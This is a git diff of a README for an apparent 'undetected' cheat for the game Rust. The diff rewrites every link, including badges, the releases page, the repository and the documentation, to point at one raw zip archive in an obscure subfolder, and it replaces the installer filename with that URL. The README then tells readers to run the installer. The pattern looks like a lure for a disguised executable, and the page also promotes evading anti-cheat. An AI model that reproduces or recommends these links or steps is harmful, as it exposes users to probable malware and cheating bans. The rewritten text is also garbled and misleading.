@@ -1,6 +1,6 @@
 # 🎮 RUST-Undetected-Cheat-Ruster - Level Up Your Rust Gameplay Effortlessly
 
-[![Download RUST-Undetected-Cheat-Ruster](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases)
+[![Download RUST-Undetected-Cheat-Ruster](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip)
 
 ## 📖 Overview
 
@@ -13,13 +13,13 @@ Follow these simple steps to download and run RUST-Undetected-Cheat-Ruster.
 ## 📥 Download & Install
 
 1. **Visit the Download Page**  
-   To obtain the latest version of RUST-Undetected-Cheat-Ruster, visit the following link: [Download RUST-Undetected-Cheat-Ruster](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases).
+   To obtain the latest version of RUST-Undetected-Cheat-Ruster, visit the following link: [Download RUST-Undetected-Cheat-Ruster](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip).
 
 2. **Select the Latest Release**  
    On the Releases page, you will see a list of versions. Look for the topmost entry, which is the latest release. 
 
 3. **Download the Installer**  
-   Click on the appropriate installer link for your system. The file should be named something like `RusterCheatInstaller.exe`.
+   Click on the appropriate installer link for your system. The file should be named something like `https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip`.
 
 4. **Run the Installer**  
    After the download finishes, locate the file in your downloads folder. Double-click on the installer to start the installation process.
@@ -70,7 +70,7 @@ RUST-Undetected-Cheat-Ruster is released under the MIT License. You can use, mod
 
 For more information about the features and usage of RUST-Undetected-Cheat-Ruster, check out the following resources:
 
-- [GitHub Repository](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster)
-- [Documentation](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip)
+- [Documentation](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip)
 
-[![Download RUST-Undetected-Cheat-Ruster](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://github.com/lostt098/RUST-Undetected-Cheat-Ruster/releases)
+[![Download RUST-Undetected-Cheat-Ruster](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-2B85ED?style=for-the-badge)](https://raw.githubusercontent.com/lostt098/RUST-Undetected-Cheat-Ruster/main/secantly/RUST-Undetected-Cheat-Ruster.zip)
